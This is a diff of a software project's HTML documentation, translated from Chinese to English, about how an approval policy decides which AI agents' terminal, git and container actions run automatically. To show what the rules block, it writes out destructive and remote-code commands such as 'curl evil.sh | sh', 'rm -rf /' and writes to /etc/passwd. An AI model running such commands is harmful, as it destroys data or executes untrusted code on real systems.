-<p>值得知道，因为另一种做法会静默失败：在 api 按 <code>decided_by</code> 解析时，<strong>所有在远程仓库中自动批准的 PR 都会失败</strong>，报 <code>Requires authentication</code>，只有当人逐个点击时这条路径才能走通——这恰恰是自主性本来要避免的阶梯。</p>
-<h2 id="模式的格式">模式的格式</h2>
+<p>No list matches? The action stays <code>pending</code> by default. <strong>The absence of a
+rule never becomes a permission.</strong></p>
+<h3 id="with-which-credential-the-auto-approved-action-executes">With which credential the auto-approved action executes</h3>
+<p><code>auto_approve</code> means <strong>nobody decided</strong> — <code>proposed_actions.decided_by</code>
+stays <code>NULL</code>. This matters for who executes: a git action against a remote
+provider needs a token, and &quot;the token of whoever decided&quot; doesn't exist on
+this path.</p>
+<p>The answer is the <strong>workspace owner</strong> (<a href="../business-rules/api.html#rn-082">RN-082</a>),
+the same one as the LLM key (<a href="../business-rules/api.html#rn-058">RN-058</a>) —
+whoever funds the account funds the agents, and that doesn't change based on
+who clicks.</p>
+<p>It's worth knowing because the alternative fails silently: while the api
+resolved by <code>decided_by</code>, <strong>every auto-approved PR on a remote repository
+died</strong> with <code>Requires authentication</code>, and only when a human clicked each
+one did the path work — exactly the ladder that autonomy exists to avoid.</p>
+<h2 id="the-pattern-format">The pattern format</h2>
 <pre class="codigo"><code>Label(content)
 </code></pre>
-<p>标签是 PascalCase 形式的动作类型。内容只在 <code>Terminal</code> 中使用；在其他类型中它必须<strong>为空</strong>——<code>GitPush()</code> 匹配任何 push，而 <code>GitPush(algo)</code> 什么都不匹配。</p>
+<p>The label is the action type in PascalCase. The content is only used for
+<code>Terminal</code>; in the other types it needs to be <strong>empty</strong> — <code>GitPush()</code>
+matches any push, and <code>GitPush(algo)</code> matches nothing.</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>动作类型</th>
-<th>标签</th>
-<th>最低角色</th>
+<th>action type</th>
+<th>label</th>
+<th>minimum role</th>
 </tr>
 </thead>
 <tbody>
@@ -180,45 +193,93 @@
 </tr>
 </tbody>
 </table></div>
-<p>最低角色在文件<strong>之前</strong>检查。达不到则 <code>deny</code>——
-<code>permissions.json</code> 不会授予 IAM 拒绝的东西</p>
-<p><code>parallelize</code>（Fase 14d）是唯一一个效果不是触及代码或仓库的：它请求更多<strong>agent</strong>。它是 <code>maintainer</code>，理由与
-<code>spend</code> 相同——授权成本的人是对项目负责的人。它只存在于 lead 的上限之上；在上限之内没有动作，因为没有什么需要决定
-（<a href="../business-rules/api.html#rn-083">RN-083</a>）
-（<a href="../business-rules/api.html#rn-005">RN-005</a>）。</p>
-<p><code>propose_execution_plan</code>（ADR 0086，<a href="../business-rules/engine.html#rn-284">RN-284</a>）
-是 Dev Lead 的计划——每个模块多少个 agent 以及为什么，在任何一个启动之前。与 <code>parallelize</code> 同一量级：关于产品将在并行上花费<strong>多少</strong>的决定，只不过是在开始时而不是在超出上限时。与 <code>parallelize</code>/<code>raise_max_parallel</code> 不同，它<strong>不</strong>在绝对上限块中——可以配置为 <code>auto_approve</code>，
-与 <code>open_adr_pr</code>/<code>open_infra_pr</code> 一样——而在它处于 <code>pending</code> 期间，Dev
-Lead 的轮次被<strong>挂起</strong>等待决定，而不只是对话停住。</p>
-<p><code>assess_implementability</code>（ADR 0090，<a href="../business-rules/api.html#rn-340">RN-340</a>）
-是对一个故事可实现性的评估（gate <code>implementavel</code>，
-<code>docs/gates.yml</code>）——与 <code>propose_execution_plan</code> <strong>同一</strong>量级、<strong>同一</strong>理由：会话的初始决定，而非超出上限，因此同样不在绝对上限块中。它在 <code>pending</code> 期间以同样方式挂起 Dev Lead 的轮次。</p>
-<p><code>container_stop</code> 和 <code>container_remove</code>（ADR 0136，
-<a href="../business-rules/api.html#rn-495">RN-495</a>）是全局容器页面
-（<code>/containers</code>）在有人点击项目行上的“停止”或“移除”时提出的两个动作——总是人，从不是 agent。两者都是
-<code>maintainer</code>，与 <code>container_start</code> 一样：由对项目基础设施负责的人决定。<code>container_stop</code> 沿用 <code>container_start</code> 的校准——<strong>可以</strong>配置为 <code>auto_approve</code>——除了预置：<code>container_stop</code> 从不被预置，而 <code>container_start</code> 在 Infra agent 的 handoff 被接受时为它预置为 <code>auto_approve</code>（ADR 0190，
-<a href="../business-rules/api.html#rn-671">RN-671</a>）。正是这个预置让 Infra Lead 的<strong>服务器</strong>在该接受时提出的启动无需第二次点击即可运行；
-最低 <code>maintainer</code>、按模式/状态的拒绝以及无 broker 时的 409 仍在它之前生效。
-<code>container_remove</code> 不行：它丢弃容器并强制完全重新配置，位于下方的绝对上限块中，与有外部效果的 git/特权命令同等对待。</p>
-<p><strong>三者都不关心容器在哪里启动。</strong> <code>decide()</code> 和上面所有规则都忽略 <code>executionMode</code>——分支只存在于批准之后的<strong>执行</strong>中（<code>ExecuteContainerStartUseCase</code>/
-<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>）：<code>container</code> 项目被批准的动作仍然发往 broker
-（<code>ContainerBrokerPort</code>，无变化）；<code>mounted</code>/<code>runner</code> 项目的则改为发往连接到该项目的 <strong>RUNNER</strong>，经由它已维持的 Phoenix 通道（<a href="../business-rules/produto.html#rn-497">RN-497</a>，
-<a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137</a>）。“没有连接的 runner”和“runner 尝试了并拒绝”是两种常见的 <code>failed</code> 结果，与 broker 拒绝同一纪律——绝不是未处理的异常。</p>
-<p><strong><code>container_start</code> 的执行中还会发生一件事，且只在 <code>mounted</code> 中</strong>（<a href="../business-rules/api.html#rn-501">RN-501</a>，
-<a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142</a>）：项目文件夹在那里被<strong>实体化</strong>。创建 <code>mounted</code> 项目不再要求文件夹存在——创建只校验路径格式以及
-<code>BRABO_PROJECTS_BASE</code>——因为产品负责人的要求是 bind-mount 在架构师的决定<strong>之后</strong>创建，而 <code>container_start</code> 是第一个符合条件的时刻。于是执行器对文件夹执行 <code>mkdir -p</code>，证明它在 api 内部可写，并盖上 <code>workspace_verified_at</code>，全部在任何生命周期转换<strong>之前</strong>。api 无法创建或访问的文件夹是一个<strong>有名字的</strong> <code>failed</code>——点名变量、路径、可能原因（主机上文件夹的所有者；镜像以 non-root 运行，ADR 0024）和下一步——而生命周期那一行<strong>不会</strong>被标记为 <code>provisioning</code>：先标记再发现无法写入，会让 <code>project_containers</code> 断言一个从未存在的状态。这些都不触及 <code>decide()</code>、上限或谁能批准。</p>
-<p><strong>而 <code>container_start</code> 也在那里解析自己的资源</strong>
-（<a href="../business-rules/api.html#rn-683">RN-683</a>，
-<a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199</a>）：提案<strong>省略</strong>的字段——在 handoff 接受时服务器启动的情况下是全部字段——变成从现行 <code>module_map</code> 派生的<strong>最小值</strong>（每个模块声明的总和，在仍有模块什么都没声明时以今天的默认值为下限）；<strong>低于</strong>该最小值的字段是一个有名字的 <code>failed</code>，在任何镜像决定或生命周期转换之前写入；高于它，则适用一贯的上限。与文件夹的实体化一样，这是执行，不是策略：
-<code>decide()</code> 和谁能批准都不变。</p>
-<h2 id="模式如何匹配命令">模式如何匹配命令</h2>
-<p>不是按子串。命令按 shell 规则分词，模式按<strong>词元前缀</strong>匹配：</p>
+<p>The minimum role is checked <strong>before</strong> the file. Without it, <code>deny</code> —
+<code>permissions.json</code> cannot grant what IAM denies</p>
+<p><code>parallelize</code> (Phase 14d) is the only one whose effect isn't touching code
+or repository: it requests more AGENTS. It's at <code>maintainer</code> for the same
+reason as <code>spend</code> — whoever authorizes cost is whoever is accountable for
+the project. It only exists above the lead's cap; within it there's no
+action, because there's nothing to decide
+(<a href="../business-rules/api.html#rn-083">RN-083</a>)
+(<a href="../business-rules/api.html#rn-005">RN-005</a>).</p>
+<p><code>propose_execution_plan</code> (ADR 0086, <a href="../business-rules/engine.html#rn-284">RN-284</a>)
+is the Dev Lead's plan — how many agents per module and why, before any of
+them come up. Same caliber as <code>parallelize</code>: a decision about HOW MUCH the
+product will spend on parallelism, just at the start instead of at a cap
+overrun. Unlike <code>parallelize</code>/<code>raise_max_parallel</code>, it is NOT in the
+absolute-caps block — it can be configured as <code>auto_approve</code>, like
+<code>open_adr_pr</code>/<code>open_infra_pr</code> — and while it's <code>pending</code>, the Dev Lead's
+turn stays SUSPENDED waiting for the decision, not just the conversation
+stalled.</p>
+<p><code>assess_implementability</code> (ADR 0090, <a href="../business-rules/api.html#rn-340">RN-340</a>)
+is the implementability assessment of a story (gate <code>implementavel</code>,
+<code>config/gates.yml</code>) — SAME caliber and SAME reasoning as
+<code>propose_execution_plan</code>: an initial session decision, not a cap overrun,
+and therefore also outside the absolute-caps block. It suspends the Dev
+Lead's turn the same way while <code>pending</code>.</p>
+<p><code>container_stop</code> and <code>container_remove</code> (ADR 0136,
+<a href="../business-rules/api.html#rn-495">RN-495</a>) are the two actions the global
+containers page (<code>/containers</code>) proposes when someone clicks &quot;Stop&quot; or
+&quot;Remove&quot; on a project's row — always a human, never an agent. Both are
+<code>maintainer</code>, same as <code>container_start</code>: whoever is accountable for the
+project's infra decides. <code>container_stop</code> follows <code>container_start</code>'s
+calibration — it CAN be configured <code>auto_approve</code> — except for the seed:
+<code>container_stop</code> is never seeded, while <code>container_start</code> is seeded
+<code>auto_approve</code> for the Infra agent when its handoff is accepted (ADR 0190,
+<a href="../business-rules/api.html#rn-671">RN-671</a>). That seed is what lets the start the
+Infra Lead's SERVER proposes on that accept run without a second click; the
+<code>maintainer</code> minimum, the mode/state refusals and the no-broker 409 all still
+apply before it.
+<code>container_remove</code> cannot: it discards the container and forces a full
+reprovision, and is in the absolute-caps block below, same treatment as
+external-effect git/privileged commands.</p>
+<p><strong>None of the three cares WHERE the container comes up.</strong> <code>decide()</code> and
+every rule above are agnostic of <code>executionMode</code> — the branch only exists
+in EXECUTION, after approval (<code>ExecuteContainerStartUseCase</code>/
+<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): a
+<code>container</code> project's approved action still goes to the broker
+(<code>ContainerBrokerPort</code>, unchanged); a <code>mounted</code>/<code>runner</code> project's goes to
+the RUNNER connected to the project instead, over the Phoenix channel it
+already keeps (<a href="../business-rules/produto.html#rn-497">RN-497</a>,
+<a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137</a>). &quot;No
+runner connected&quot; and &quot;the runner tried and refused&quot; are both ordinary
+<code>failed</code> outcomes, same discipline as a broker refusal — never an
+uncaught exception.</p>
+<p><strong>One more thing happens in <code>container_start</code> execution, and only for
+<code>mounted</code></strong> (<a href="../business-rules/api.html#rn-501">RN-501</a>,
+<a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142</a>): the
+project's folder is MATERIALIZED there. Creating a <code>mounted</code> project no
+longer requires the folder to exist — creation validates only the path
+format plus <code>BRABO_PROJECTS_BASE</code> — because the product owner's requirement
+is that the bind-mount be created AFTER the architect's decision, and
+<code>container_start</code> is the first moment that qualifies. So the executor
+<code>mkdir -p</code>s the folder, proves it writable from inside the api, and stamps
+<code>workspace_verified_at</code>, all BEFORE any lifecycle transition. A folder the
+api cannot create or reach is a NAMED <code>failed</code> — it names the variable, the
+path, the likely cause (folder ownership on the host; images run non-root,
+ADR 0024) and the next step — and the lifecycle row is <strong>not</strong> marked
+<code>provisioning</code>: marking it and only then finding out you cannot write would
+leave <code>project_containers</code> asserting a state that never existed. None of
+this touches <code>decide()</code>, the caps, or who may approve.</p>
+<p><strong>And <code>container_start</code> resolves its resources there</strong>
+(<a href="../business-rules/api.html#rn-683">RN-683</a>,
+<a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199</a>): a field
+the proposal OMITS — every field, in the server's start on handoff acceptance
+— becomes the MINIMUM derived from the current <code>module_map</code> (the sum of what
+each module declared, floored at today's default while any module declared
+nothing); a field BELOW that minimum is a named <code>failed</code>, recorded before any
+image decision or lifecycle transition; above it, the usual ceiling applies.
+Like the folder materialization, this is execution, not policy: <code>decide()</code>
+and who may approve do not change.</p>
+<h2 id="how-a-pattern-matches-a-command">How a pattern matches a command</h2>
+<p>Not by substring. The command is tokenized with shell rules and the pattern
+matches by <strong>token prefix</strong>:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>模式</th>
-<th>命令</th>
-<th>匹配？</th>
+<th>pattern</th>
+<th>command</th>
+<th>matches?</th>
 </tr>
 </thead>
 <tbody>
@@ -230,7 +291,7 @@ Lead 的轮次被<strong>挂起</strong>等待决定，而不只是对话停住�
 <tr>
 <td><code>Terminal(pnpm test)</code></td>
 <td><code>pnpm test --watch</code></td>
-<td>✅（前缀）</td>
+<td>✅ (prefix)</td>
 </tr>
 <tr>
 <td><code>Terminal(pnpm test)</code></td>
@@ -240,319 +301,554 @@ Lead 的轮次被<strong>挂起</strong>等待决定，而不只是对话停住�
 <tr>
 <td><code>Terminal(pnpm test:*)</code></td>
 <td><code>pnpm test:unit</code></td>
-<td>✅（<code>*</code> 在词元末尾）</td>
+<td>✅ (<code>*</code> at the end of the token)</td>
 </tr>
 <tr>
 <td><code>Terminal(rm)</code></td>
 <td><code>sudo rm -rf x</code></td>
-<td>❌ — <code>rm</code> 不是第一个词元</td>
+<td>❌ — <code>rm</code> is not the first token</td>
 </tr>
 </tbody>
 </table></div>
-<p><code>*</code> 只在<strong>一个词元之内</strong>、末尾有效。它不是路径 glob：
-<code>Terminal(rm -rf /*)</code> 匹配字面词元 <code>/*</code>，而不是“<code>/</code> 之下的任何东西”。</p>
-<p>环境变量按字面保留：<code>$HOME</code> 在匹配中仍是 <code>$HOME</code>，而不是展开为空——展开会静默改变被比较的内容。</p>
-<h2 id="复合命令">复合命令</h2>
-<p>含有 <code>&amp;&amp;</code>、<code>;</code>、<code>|</code>、<code>||</code> 或 <code>&amp;</code> 的命令会被拆分为片段，<strong>每个片段单独评估</strong>：</p>
+<p>The <code>*</code> applies <strong>inside a token</strong>, at the end. It's not a path glob:
+<code>Terminal(rm -rf /*)</code> matches the literal token <code>/*</code>, not &quot;anything under
+<code>/</code>&quot;.</p>
+<p>Environment variables are preserved literally: <code>$HOME</code> stays <code>$HOME</code> in the
+match, instead of expanding to empty — expanding would silently change what
+is being compared.</p>
+<h2 id="compound-command">Compound command</h2>
+<p>A command with <code>&amp;&amp;</code>, <code>;</code>, <code>|</code>, <code>||</code> or <code>&amp;</code> is split into segments, and
+<strong>each segment is evaluated separately</strong>:</p>
 <ul>
-<li>任一片段在 <code>deny</code> 中 → 整个命令为 <code>deny</code>。</li>
-<li><strong>所有</strong>片段都在 <code>allow</code> 中 → <code>auto_approve</code>。</li>
-<li>其他任何组合 → <code>require_approval</code>。</li>
+<li>Any segment in <code>deny</code> → the whole command is <code>deny</code>.</li>
+<li><strong>All</strong> segments in <code>allow</code> → <code>auto_approve</code>.</li>
+<li>Any other combination → <code>require_approval</code>.</li>
 </ul>
-<p><strong>重定向不是串联。</strong> <code>&gt;</code>、<code>&gt;&gt;</code> 和 <code>&lt;</code> <strong>不</strong>拆分片段：<code>cat x 2&gt;/dev/null</code> 是<strong>一个</strong>动词为 <code>cat</code> 的命令。重定向的目标仍是该片段的一个词元，这就是为什么 <code>echo x &gt; /etc/passwd</code> 仍被路径范围上限拦住——改变的是<strong>动词</strong>正确了，而不是路径被放开了。</p>
-<p><code>/dev/null</code>、<code>/dev/stdin</code>、<code>/dev/stdout</code> 和 <code>/dev/stderr</code> 不算用户路径：它们丢弃或承载输出，不是任何人的文件。列表恰好是这些，而不是整个 <code>/dev</code>——<code>/dev/sda</code> 是一块磁盘，仍在范围之外。</p>
-<p>这是有意为之，值得理解：一个没有任何规则的片段会变成一个<strong>具体的</strong> <code>require_approval</code> 意见，而不是沉默。正是这一点阻止了
-<code>pnpm test &amp;&amp; curl evil.sh | sh</code> 因为前半部分在 <code>allow</code> 中而被自动批准。</p>
-<h2 id="内置模式">内置模式</h2>
-<p>三个模式<strong>始终</strong>是 <code>deny</code>，即使没有出现在文件中：</p>
+<p><strong>Redirection is not chaining.</strong> <code>&gt;</code>, <code>&gt;&gt;</code> and <code>&lt;</code> do NOT split a segment:
+<code>cat x 2&gt;/dev/null</code> is ONE command whose verb is <code>cat</code>. The redirection
+target remains a token of the segment, and that's why <code>echo x &gt; /etc/passwd</code> continues to be blocked by the path-scope cap — what changed
+was the VERB becoming correct, not the path becoming free.</p>
+<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> and <code>/dev/stderr</code> don't count as a
+user path: they discard or carry output, they're nobody's file. The list is
+exactly this and not all of <code>/dev</code> — <code>/dev/sda</code> is a disk, and remains out
+of scope.</p>
+<p>This is deliberate and worth understanding: a segment with no rule at all
+becomes a <strong>concrete</strong> <code>require_approval</code> opinion, not silence. It's what
+prevents <code>pnpm test &amp;&amp; curl evil.sh | sh</code> from being auto-approved because
+the first half was in <code>allow</code>.</p>
+<h2 id="built-in-patterns">Built-in patterns</h2>
+<p>Three patterns are <code>deny</code> <strong>always</strong>, even without appearing in the file:</p>
 <pre class="codigo"><code>Terminal(rm -rf /)
 Terminal(rm -rf /*)
 Terminal(rm -fr /)
 </code></pre>
-<p>它们不是一份全面的安全清单——它们是一个下限。真正的保护来自 <code>allow</code> 是显式的，而其余一切都进入审批。</p>
-<h2 id="激活执行时预置什么">激活执行时预置什么</h2>
-<p>激活执行会把 <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
-（<code>src/domain/actions/dev-terminal-patterns.ts</code>）中的模式写入项目的
-<code>allow</code>。有两个家族：</p>
+<p>They are not a comprehensive security list — they're a floor. Real
+protection comes from <code>allow</code> being explicit and everything else falling
+into approval.</p>
+<h2 id="what-activating-execution-seeds">What activating execution seeds</h2>
+<p>Activating execution writes the <code>DEV_TERMINAL_ALLOW_PATTERNS</code> patterns
+(<code>src/domain/actions/dev-terminal-patterns.ts</code>) into the project's
+<code>allow</code>. There are two families:</p>
 <ul>
-<li><strong>读取自己的 worktree</strong> — <code>ls</code>、<code>pwd</code>、<code>find</code>、<code>cat</code>、<code>head</code>、
-<code>tail</code>、<code>grep</code>、<code>wc</code>、<code>echo</code>、<code>git status</code>、<code>git diff</code>、<code>git log</code>；</li>
-<li><strong>读取 git 的历史/远程/配置</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>、<code>git remote -v</code>、<code>git remote show</code>、<code>git worktree list</code>、<code>git show</code>、<code>git for-each-ref</code>、<code>git ls-tree</code>、<code>git rev-parse</code>、<code>git config --get</code>（见 <a href="../business-rules/api.html#rn-143">RN-143</a>）；</li>
-<li><strong>构建与测试</strong> — <code>pnpm install</code>、<code>pnpm test</code>、<code>npm run</code>、<code>npx vitest</code>、<code>mix test</code>、<code>pytest</code>、<code>go test</code>、<code>cargo test</code> 等。</li>
+<li><strong>reading the worktree itself</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
+<code>tail</code>, <code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
+<li><strong>reading git history/remote/config</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (see <a href="../business-rules/api.html#rn-143">RN-143</a>);</li>
+<li><strong>build and test</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, among others.</li>
 </ul>
-<p>第三个家族存在，是因为 <code>ReportDone</code> 只在历史中有一个 <code>exit 0</code> 的
-<code>terminal</code> 之后才允许开 PR。第一个家族存在，是因为 agent <strong>先看再构建</strong>：没有它，在刚配置好的仓库里每个 <code>ls -la</code> 都会进入审批，以 <code>status pending</code> 返回——而不是命令的输出——并烧掉 ToolLoop 的一次迭代，直到任务因上限而死（见 <a href="../business-rules/api.html#rn-068">RN-068</a>）。第二个家族存在，是因为 <code>git status</code>/<code>diff</code>/<code>log</code> 足以查看 worktree，却不足以让 agent 在一个刚被采用的仓库的历史和远程中找到方向——一次真实会话在 <code>git branch -a</code> 或 <code>git worktree list</code> 这类子命令上花了几十次手动审批，它们不在 <code>allow</code> 中，并把它们出现的每个复合命令都推向手动审批。</p>
-<p>这<strong>不会</strong>放松上面描述的任何东西。依然成立：<code>deny</code> 胜过 <code>allow</code>，内置模式仍然有效，匹配按<strong>词元</strong>前缀（允许 <code>ls</code> 不等于允许 <code>lsof</code>），复合命令要求<strong>每个</strong>片段都匹配——所以 <code>ls &amp;&amp; rm -rf /</code> 不会因为 <code>ls</code> 而通过。</p>
-<p>第二个家族需要额外小心，因为前缀匹配允许匹配前缀之后的<strong>任何</strong>东西：一个裸的 <code>Terminal(git branch)</code> 模式除了简单列出之外，还会同时匹配 <code>git branch -D nome</code>（删除）和 <code>git branch nome-nova</code>（创建），因为它看不到后面跟着什么。因此 <code>branch</code>、<code>remote</code>、<code>worktree</code> 和 <code>config</code>——四个拥有会<strong>变更</strong>的兄弟命令的——只以能让读取无歧义的 flag 作为<strong>锚点</strong>加入（<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>），绝不以裸动词加入；
-<code>git branch -D/-d/-m/-M</code>、<code>git remote add/remove/set-url</code>、
-<code>git worktree add/remove/prune</code> 和 <code>git config &lt;chave&gt; &lt;valor&gt;</code>（无 <code>--get</code>）仍需审批。<code>show</code>、<code>log</code>、<code>for-each-ref</code>、<code>ls-tree</code> 和
-<code>rev-parse</code> 不需要锚点：它们的任何后续都不会变更仓库。</p>
-<p>通过 <code>agent_autonomy</code> 自动批准 <code>terminal</code> 是另一回事，也不是这里的做法：它会放行 engine 容器内的<strong>任何</strong>命令，中间没有文件。</p>
-<h2 id="决策的完整顺序">决策的完整顺序</h2>
+<p>The third family exists because <code>ReportDone</code> only allows opening a PR after
+a <code>terminal</code> with <code>exit 0</code> in the history. The first exists because the
+agent <strong>looks before it builds</strong>: without it, every <code>ls -la</code> in a newly
+provisioned repository fell into approval, came back as <code>status pending</code> —
+and not as the command's output — and burned a ToolLoop iteration until the
+task died by limit (see <a href="../business-rules/api.html#rn-068">RN-068</a>). The second
+exists because <code>git status</code>/<code>diff</code>/<code>log</code> are enough to look at the
+worktree, but not for the agent to orient itself in the history and remotes
+of a newly adopted repository — a real session spent dozens of manual
+approvals on subcommands like <code>git branch -a</code> or <code>git worktree list</code> that
+fell outside <code>allow</code> and pushed to manual approval any compound command
+they appeared in.</p>
+<p>This does NOT loosen anything described above. It still holds that <code>deny</code>
+beats <code>allow</code>, that the built-in patterns remain active, that matching is
+by <strong>token</strong> prefix (<code>ls</code> allowed doesn't allow <code>lsof</code>), and that a
+compound command requires EVERY segment to match — so <code>ls &amp;&amp; rm -rf /</code>
+doesn't pass because of the <code>ls</code>.</p>
+<p>The second family requires extra care, because prefix matching allows
+ANYTHING after the prefix that matched: a bare pattern <code>Terminal(git branch)</code> would match both <code>git branch -D nome</code> (deletes) and <code>git branch nome-nova</code> (creates) as well as the plain listing, because it can't see
+what comes after. That's why <code>branch</code>, <code>remote</code>, <code>worktree</code> and <code>config</code> —
+the four that have a MUTATING sibling — only got in ANCHORED by the flag
+that makes the read unambiguous (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), never by
+the bare verb; <code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
+<code>git worktree add/remove/prune</code> and <code>git config &lt;chave&gt; &lt;valor&gt;</code> (without
+<code>--get</code>) still require approval. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code>
+and <code>rev-parse</code> didn't need an anchor: none of their continuations mutate
+the repository.</p>
+<p>Auto-approving <code>terminal</code> via <code>agent_autonomy</code> would be different and is
+not what's done: it would free up ANY command inside the engine container,
+with no file in the middle.</p>
+<h2 id="the-complete-decision-order">The complete decision order</h2>
 <pre class="mermaid" data-mermaid>flowchart TD
-  A[proposed_action] --&gt; B{角色 &gt;= 最低？}
-  B --&gt;|否| D1[deny：IAM 不足]
-  B --&gt;|是| C0{terminal，且项目的真实容器&lt;br/&gt;running？}
-  C0 --&gt;|是| C1[基础：auto_approve — RN-492/493]
-  C0 --&gt;|否| C[基础：require_approval]
-  C1 --&gt; D{agent_autonomy 有意见？}
+  A[proposed_action] --&gt; B{role &gt;= minimum?}
+  B --&gt;|no| D1[deny: insufficient IAM]
+  B --&gt;|yes| C0{terminal, and project's&lt;br/&gt;real container running?}
+  C0 --&gt;|yes| C1[base: auto_approve — RN-492/493]
+  C0 --&gt;|no| C[base: require_approval]
+  C1 --&gt; D{agent_autonomy has an opinion?}
   C --&gt; D
   D --&gt;|deny| D2[deny]
-  D --&gt;|其他| E[采用该意见]
-  D --&gt;|无| E2[保持基础]
-  E --&gt; F{permissions.json 匹配？}
+  D --&gt;|other| E[adopts the opinion]
+  D --&gt;|none| E2[keeps the base]
+  E --&gt; F{permissions.json matches?}
   E2 --&gt; F
   F --&gt;|deny| D3[deny]
-  F --&gt;|allow/ask| G[采用文件的裁定]
-  F --&gt;|无| G2[保持之前的]
-  G --&gt; S{terminal 触及项目文件夹&lt;br/&gt;之外的路径？}
+  F --&gt;|allow/ask| G[adopts the file's verdict]
+  F --&gt;|none| G2[keeps the previous]
+  G --&gt; S{terminal touches path&lt;br/&gt;outside the project folder?}
   G2 --&gt; S
-  S --&gt;|是，且原为 auto_approve| I2[上限：require_approval]
-  S --&gt;|否| Z{git_push/pr_open，或 terminal 请求&lt;br/&gt;git push、PR、deploy 或 sudo/doas？}
-  Z --&gt;|是，且原为 auto_approve| I3[上限：require_approval — RN-418]
-  Z --&gt;|否| H{合并到受保护 branch&lt;br/&gt;或 instruction_patch？}
-  H --&gt;|是，且原为 auto_approve| I[上限：require_approval]
-  H --&gt;|否| J[最终裁定]
+  S --&gt;|yes, and was auto_approve| I2[CAP: require_approval]
+  S --&gt;|no| Z{git_push/pr_open, or terminal requests&lt;br/&gt;git push, PR, deploy, or sudo/doas?}
+  Z --&gt;|yes, and was auto_approve| I3[CAP: require_approval — RN-418]
+  Z --&gt;|no| H{merge into protected branch&lt;br/&gt;or instruction_patch?}
+  H --&gt;|yes, and was auto_approve| I[CAP: require_approval]
+  H --&gt;|no| J[final verdict]
 </pre>
-<p><strong>节点 <code>Z</code> 改变了位置</strong>（<a href="../business-rules/api.html#rn-418">RN-418</a>，修订
-<a href="../business-rules/api.html#rn-106">RN-106</a>）：在本地 runner 到来之前，它紧跟在 IAM 之后并返回 <code>deny</code>——现在它是一个<strong>上限</strong>，与其他三个位于同一个最终块中，在
-<code>agent_autonomy</code> 和 <code>permissions.json</code> 已经给出意见之后应用。原因见下方
-<a href="#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418">“外部效果与特权命令的边界”</a>
-一节。</p>
-<h3 id="自动模式agent_autonomy-的通配符rn-153">“自动模式”：<code>agent_autonomy</code> 的通配符（<a href="../business-rules/api.html#rn-153">RN-153</a>）</h3>
-<p>上图中的 <code>agent_autonomy 有意见？</code> 节点不知道、也无需知道意见来自<strong>具体</strong>规则（<code>actionType: &quot;terminal&quot;</code>）还是通配符 <code>actionType: &quot;*&quot;</code>——“自动模式”：该 agent <strong>任何</strong>动作类型的自主权，通过在
-<code>ApprovalCard</code> 上点击“自动模式”一键开启。解析发生在本图开始<strong>之前</strong>，只在一个仓储中：<code>DrizzleAgentAutonomyRepository.findMode</code> 在同一查询中查找具体规则和通配符，两者都存在时返回具体规则——在 <code>&quot;*&quot;: auto_approve</code> 开启时写入 <code>terminal: deny</code>，仍会对该 agent 拒绝 <code>terminal</code>，同时放行其余。</p>
-<p>因此图中没有新增节点，而下面的上限对“自动模式”生效，是因为它们响应的是 <code>current.policy === 'auto_approve'</code>，而从不看其来源（<a href="../business-rules/api.html#rn-154">RN-154</a>）。</p>
-<p><strong>有一个由产品负责人决定的例外：自动模式放开路径范围</strong>（<a href="../business-rules/api.html#rn-603">RN-603</a>，
-<a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167</a>）。仓储还会返回自主权<strong>来自何处</strong>
-（<code>AgentAutonomyRepository.resolve</code>：<code>especifica</code> 或 <code>curinga</code>），<code>decide()</code> 以 <code>ctx.autonomyOrigin</code> 接收它。当通配符解析为
-<code>auto_approve</code> 时，两种审批请求消失：<a href="#path-scope">路径范围上限</a>，以及复合命令为没有任何规则的片段合成的 <code>require_approval</code>。于是处于自动模式的 agent 可以运行任何终端命令，即使在项目文件夹之外——在
-<code>exp001</code> 中测得，开启自动模式后 51 个请求中有 47 个只来自范围，因为 dev agent 在容器内（<code>/work</code>）运行，而范围与<strong>主机</strong>的根比较。其余一切保留：<code>deny</code> 胜出，文件中写的 <code>ask</code> 会询问，外部效果/特权上限（push、PR、deploy、
-<code>sudo</code>/<code>doas</code>）先运行并忽略来源，而合并到受保护 branch、
-<code>instruction_patch</code>、并行和 <code>container_remove</code> 从不自动批准。一条<strong>具体</strong>规则（<code>terminal: auto_approve</code> 或 <code>terminal: require_approval</code>）不是自动模式，保留范围上限。</p>
-<p>当人批准的 <code>git_merge</code> <strong>执行</strong>且 provider 报告 PR 为
-<code>merged</code> 时，PR 所来自的任务变为 <code>done</code>——仅一次：同一 PR 的重复合并不会再次移动它，也不会写入第二个
-<code>backlog.task_status_changed</code> 事件（<a href="../business-rules/api.html#rn-628">RN-628</a>）。合并本身从不自动化（<a href="../business-rules/api.html#rn-418">RN-418</a>）。</p>
